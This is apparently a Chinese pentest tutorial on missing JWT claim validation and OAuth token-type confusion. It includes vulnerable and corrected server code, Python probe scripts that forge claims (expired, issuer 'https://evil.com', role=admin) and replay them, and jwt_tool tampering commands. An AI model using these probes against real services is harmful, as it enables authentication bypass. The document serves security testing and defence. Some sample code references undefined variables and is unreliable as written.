# JWT Claim 验证缺失 & Token 混用

## 原理

JWT 的 Claim 字段构成安全边界，但服务端常只解析 Payload 做业务判断，忽略了 Claim 的语义验证。同时，同一 SSO 体系下的不同 Token 类型（ID Token、Access Token、Refresh Token）若被混用，可导致权限绕过。

---

## 1. Claim 验证缺失

### Claim 安全矩阵

| Claim | 含义 | 缺失验证的后果 | 攻击方法 |
|-------|------|---------------|----------|
| `exp` | 过期时间 | 泄露的旧 Token 永久有效 | 设为 `9999999999` 或移除 |
| `nbf` | 生效时间 | 未来的 Token 被提前使用 | 设为 `0` 或移除 |
| `iss` | 签发者 | 接受其他 IdP 签发的 Token | 改为其他信任域 |
| `aud` | 接收者 | Service A 的 Token 用于 Service B | 改为目标服务的 audience |
| `sub` | 主体标识 | 权限判断完全依赖可伪造字段 | 改为管理员 ID |
| `jti` | Token 唯一 ID | 无法防止重放 | 相同 jti 多次使用 |
| `typ` | Token 类型 | ID Token 当 Access Token 用 | 见下文 Token 混用 |
| `iat` | 签发时间 | 一般不单独利用 | 配合其他 Claim |

### 伪代码：漏洞逻辑

```python
# 漏洞 — 只解析 Payload，不做 Claim 验证
def handle_request(auth_header):
    token = auth_header.replace("Bearer ", "")
    payload = jwt.decode(token, options={"verify_signature": False})
    # BUG: 没有调用 jwt.decode(token, key, algorithms=[...],
    #       options={"verify_exp": True, "verify_aud": True, ...})

    user_id = payload.get("sub")
    role = payload.get("role", "user")

    if role == "admin":
        return get_admin_data()
    else:
        return get_user_data(user_id)
```

```python
# 正确 — 全部 Claim 验证
def handle_request(auth_header):
    token = auth_header.replace("Bearer ", "")
    try:
        payload = jwt.decode(
            token,
            key=public_key,
            algorithms=["RS256"],
            options={
                "verify_signature": True,
                "verify_exp": True,      # 验证过期
                "verify_nbf": True,      # 验证生效时间
                "verify_iss": True,      # 验证签发者
                "verify_aud": True,      # 验证接收者
            },
            issuer="https://auth.company.com",
            audience="api.company.com"
        )
    except jwt.ExpiredSignatureError:
        abort(401, "Token expired")
    except jwt.InvalidAudienceError:
        abort(401, "Invalid audience")
    except jwt.InvalidIssuerError:
        abort(401, "Invalid issuer")
    # ...
```

### 伪代码：逐 Claim 攻击探测

```python
# probe_claim_validation.py

def probe_claim_validation(target_url: str, original_token: str):
    """
    探测每个 Claim 是否被验证
    返回每个 Claim 的状态: verified / not_verified / unknown
    """
    header_b64, _, sig_b64 = original_token.split('.')
    payload = json.loads(base64url_decode(original_token.split('.')[1]))

    tests = []

    # 测试 1: exp — 过期 Token
    expired = payload.copy()
    expired['exp'] = 1000000000  # 2001 年
    tests.append(("exp (expired)", expired))

    # 测试 2: exp — 移除
    no_exp = payload.copy()
    no_exp.pop('exp', None)
    tests.append(("exp (removed)", no_exp))

    # 测试 3: nbf — 未来时间
    future_nbf = payload.copy()
    future_nbf['nbf'] = 9999999999  # 还没到
    tests.append(("nbf (future)", future_nbf))

    # 测试 4: iss — 不同签发者
    diff_iss = payload.copy()
    diff_iss['iss'] = "https://evil.com"
    tests.append(("iss (different)", diff_iss))

    # 测试 5: aud — 不同接收者
    diff_aud = payload.copy()
    diff_aud['aud'] = "other-service"
    tests.append(("aud (different)", diff_aud))

    # 测试 6: 全部移除
    minimal = {"sub": payload.get("sub"), "role": "admin"}
    tests.append(("minimal (role=admin)", minimal))

    results = {}
    for name, modified_payload in tests:
        token = re_sign_or_keep(header_b64, modified_payload,
                                 sig_b64, original_token)
        resp = requests.get(target_url,
            headers={"Authorization": f"Bearer {token}"})
        results[name] = {
            "status": resp.status_code,
            "vulnerable": resp.status_code not in (401, 403)
        }
    return results
```

---

## 2. Token 类型混用

### 核心概念

```
┌─────────────────────────────────────────────────────────────┐
│ OAuth 2.0 / OIDC 三种 Token                                  │
│                                                              │
│  ID Token (身份证明)                                          │
│    用途: 证明"我是谁"（给客户端看的）                          │
│    受众: 客户端 (client_id)                                   │
│    包含: sub, name, email, picture                           │
│    ❌ 不应该用于 API 授权                                     │
│                                                              │
│  Access Token (访问授权)                                      │
│    用途: 证明"我能访问什么资源"（给 API 看的）                  │
│    受众: 资源服务器                                            │
│    包含: sub, scope, permissions                             │
│    ✅ 用于 API 调用                                           │
│                                                              │
│  Refresh Token (刷新凭证)                                     │
│    用途: 获取新的 Access Token                                │
│    受众: 授权服务器                                            │
│    ❌ 不应该暴露给前端以外的服务                               │
├─────────────────────────────────────────────────────────────┤
│ 攻击: 用 ID Token 调用需要 Access Token 的 API                │
│                                                              │
│   如果 API 只检查 sub 和签名，不检查 aud 和 typ:               │
│   → ID Token 也能通过验证                                     │
│   → 可能绕过某些 scope 限制                                   │
└─────────────────────────────────────────────────────────────┘
```

### 伪代码：Token 混用攻击

```python
# attack_token_confusion.py

def test_token_confusion(target_api: str, id_token: str, access_token: str):
    """
    测试 Token 混用场景

    场景:
      1. ID Token → 调用 API（能否替代 Access Token）
      2. 低权限 Access Token → 调用高权限 API
      3. Service A Access Token → 调用 Service B API
      4. Refresh Token → 调用 API
    """

    # 测试 1: ID Token 当 Access Token 用
    resp = requests.get(target_api,
        headers={"Authorization": f"Bearer {id_token}"})
    if resp.status_code == 200:
        print("[!] ID Token accepted as Access Token!")

    # 测试 2: 修改 typ 字段
    # 如果 ID Token 的 Header 中 typ=JWT，尝试改为 typ=at+jwt
    # Access Token 规范 typ 应为 "at+jwt"
    header, payload, sig = decode_token(id_token)
    header['typ'] = 'at+jwt'
    modified = re_sign_or_keep(header, payload, sig, id_token)
    resp = requests.get(target_api,
        headers={"Authorization": f"Bearer {modified}"})

    # 测试 3: 跨服务 Token
    # 拿 Service A 的 Token 请求 Service B
    resp_b = requests.get("https://service-b.target.com/api/data",
        headers={"Authorization": f"Bearer {access_token_for_a}"})
    if resp_b.status_code == 200:
        print("[!] Cross-service token accepted! (aud not verified)")

    # 测试 4: Refresh Token 调 API
    resp = requests.get(target_api,
        headers={"Authorization": f"Bearer {refresh_token}"})
    if resp.status_code == 200:
        print("[!] Refresh Token accepted as Access Token!")
```

---

## 3. 权限 Claim 直接信任

### 漏洞场景

```python
# 漏洞 — 直接从 JWT 读权限，不查数据库
@app.route("/api/admin/users")
def admin_users():
    token = request.headers.get("Authorization").split()[1]
    payload = jwt.decode(token, key, algorithms=["HS256"])
    # BUG: 直接信任 JWT 中的 role 字段
    if payload.get("role") != "admin":
        abort(403)
    return get_all_users()
```

### 攻击

```python
# 如果能通过其他方式获得签名密钥（weak key / alg confusion），
# 直接伪造 role=admin 的 Payload
# 如果签名未验证，直接修改 Payload 中的 role
# 不需要翻数据库或提升数据库中的角色
```

---

## 检测信号

- 修改被签名的 Payload → 若返回 200，签名未验证
- 过期的 Token 仍能使用 → exp 未验证
- 修改 `iss` 为其他域后仍能使用 → iss 未验证
- 从 OAuth 流程抓到的 ID Token 能调 API → typ/aud 未验证
- A 服务的 Token 能调 B 服务 → aud 未验证且不区分

## 工具命令

```bash
# jwt_tool 修改 Payload 并重放
python3 jwt_tool.py <token> -I \
  -pc "exp" -pv "9999999999" \
  -pc "role" -pv "admin" \
  -pc "aud" -pv "other-service"

# 测试过期 Token
python3 jwt_tool.py <token> -I -pc "exp" -pv "1000000000"

# 测试未来 Token
python3 jwt_tool.py <token> -I -pc "nbf" -pv "9999999999"
```
